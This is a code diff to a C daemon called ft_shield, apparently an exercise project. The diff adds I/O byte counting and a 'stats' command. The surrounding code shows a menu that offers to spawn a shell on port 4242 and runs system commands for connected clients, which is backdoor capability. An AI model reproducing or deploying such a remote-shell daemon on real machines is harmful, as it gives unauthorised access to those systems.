@@ -1,6 +1,6 @@
 #include "ft_shield.h"
 
-void print_usage(int client_fd)
+void print_usage(int client_fd, t_shield *daemon)
 {
 	const char *usage =
 		"ft_shield usage:\n"
@@ -8,16 +8,17 @@ void print_usage(int client_fd)
 		"  shell       : Spawn a shell on port 4242.\n"
 		"  users       : List currently logged in users.\n"
 		"  system      : Display system information.\n"
+		"  stats       : Show I/O statistics for the daemon.\n"
 		"  quit        : Stop the daemon.\n";
 
-	send(client_fd, usage, strlen(usage), 0);
-	display_prompt(client_fd);
+	daemon->bytes_out += send(client_fd, usage, strlen(usage), 0);
+	display_prompt(client_fd, daemon);
 }
 
 void	spawn_shell(t_shield *daemon, int client_fd)
 {
 	char output[] = "Spawning shell on port 4242.\n";
-	send(client_fd, output, strlen(output), 0);
+	daemon->bytes_out += send(client_fd, output, strlen(output), 0);
 
 	if (daemon->listen_fd != -1)
 	{
@@ -83,22 +84,44 @@ void	spawn_shell(t_shield *daemon, int client_fd)
 		setup_socket(daemon);
 }
 
-void	send_cmd_output(const char *cmd, int client_fd)
+void	send_sys_output(const char *cmd, int client_fd, t_shield *daemon)
 {
 	FILE *fp;
 	char buffer[BUFFER_SIZE];
+	char *msg = NULL;
 
 	fp = popen(cmd, "r");
 	if (!fp)
 		return ;
 
+	if (!strcmp(cmd, "who"))
+		msg = "=== Currently logged in users ===\n";
+	else if (!strcmp(cmd, "uname -a"))
+		msg = "=== System information ===\n";
+	else if (!strcmp(cmd, "uptime"))
+		msg = "=== System uptime ===\n";
+	if (msg)
+		daemon->bytes_out += send(client_fd, msg, strlen(msg), 0);
+
 	while (fgets(buffer, sizeof(buffer), fp))
-		send(client_fd, buffer, strlen(buffer), 0);
+		daemon->bytes_out += send(client_fd, buffer, strlen(buffer), 0);
 	pclose(fp);
 }
 
-void	display_prompt(int client_fd)
+void	display_prompt(int client_fd, t_shield *daemon)
 {
 	const char *prompt = ">_ ";
-	send(client_fd, prompt, strlen(prompt), 0);
+	daemon->bytes_out += send(client_fd, prompt, strlen(prompt), 0);
+}
+
+void	display_stats(int client_fd, t_shield *daemon, int client_id)
+{
+	char buffer[BUFFER_SIZE];
+
+	snprintf(buffer, sizeof(buffer),
+			"=== Daemon session I/O ===\n"
+			"Active client ID: %d\n"
+			"Received: %zu bytes | Sent: %zu bytes\n",
+			client_id, daemon->bytes_in, daemon->bytes_out);
+	daemon->bytes_out += send(client_fd, buffer, strlen(buffer), 0);
 }
